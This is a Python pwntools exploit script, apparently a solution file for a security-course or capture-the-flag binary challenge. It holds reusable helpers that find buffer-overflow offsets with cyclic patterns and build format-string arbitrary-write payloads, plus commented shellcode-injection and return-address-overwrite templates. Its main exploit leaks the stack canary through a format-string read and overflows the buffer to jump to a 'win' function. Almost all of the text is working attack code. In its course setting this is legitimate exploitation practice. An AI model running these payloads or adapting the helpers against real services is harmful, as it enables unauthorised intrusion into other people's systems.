#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 1234

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

########################################
### Buffer Overflow Helper Functions ###
########################################

def find_offset_from_rdp(after=b'?\n', cyclic_length=500, max_attempts=20):
    assert cyclic_length > 4, "Cyclic length must be greater than 4."
    
    with context.local(log_level='error'):
        for attempt in range(1, max_attempts + 1):
            connect_binary()

            cyclic_pattern = cyclic(cyclic_length)
            P.sendlineafter(after, cyclic_pattern)
            
            try:
                #################################################
                # MODIFY SECTION TO IDENTIFY LEAKED CRASH VALUE #
                #################################################

                P.recvuntil('jump to ')
                leak = P.recvline().strip()
                crash_value = int(leak, 16)
                
                #################################################

                offset = cyclic_find(crash_value)
                if offset != -1:
                    P.close()
                    return offset

            except EOFError:
                P.close()
                continue

            P.close()

    return None

### Once an offset is found...

# Overwrite RIP

    # crash_value = 0x6177616161766161
    # win_address = E.symbols['win']

    # offset = cyclic_find(crash_value)
    # payload = b"A" * offset
    # payload += p64(win_address)

# SHELLCODE INJECTION
    # payload = fit({(offset_from_rbp - len(shellcode)): shellcode, (offset_from_rbp + 8): p64(address)}, filler='\x90', length=(offset_from_rbp + 16))

######################################
### Format String Helper Functions ###
######################################

def find_offset(after = b'> ', option = 1):
    for i in range(1, 100):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, 'AAAABBBB %{}$llx'.format(i)) # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        with context.local(log_level='error'):
            P.close()

        if option == 1 and '41414141' in output:
            return i

'''
Format String Builder
---------------------
Accepts target and goal address fields in either int values or p64 - little endian - address formats.
'''
def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload

######################################
### Miscellaneous Helper Functions ###
######################################

def runner(send):
    P.recvuntil(b'[q]uit', drop=True)
    if(send in ['a']):
        P.sendline(send.encode())

def say(payload):
    runner('i')
    P.recvuntil(b'', drop=True)
    P.sendline(payload)

######################################
############## Exploit ###############
######################################

def exploit():
    # buffer starts at 0x30 (48)
    # canary starts at 0x8 (8)
    # therefore, 48 - 8 = 40 / 8 --> 5

    # find_offset(option=2)
    connect_binary()
    offset = 8 + 5
    WIN = E.symbols['win']
    P.recvuntil(b'stack canary at ')
    CANARY = int(P.recvline()[:-1], 16)
    log.info(f"CANARY at {hex(CANARY)}")

    P.recvuntil(b'> ')
    
    P.sendline(f'%{offset}$p'.encode())
    canary = int(P.recvline()[:-1], 16)
    log.info(f"CANARY value is {hex(canary)}")
    log.info(f"WIN: {hex(WIN)}")

    payload = b'A' * (0x30-0x8) + p64(canary) + b"BBBBBBBB" + p64(WIN)
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
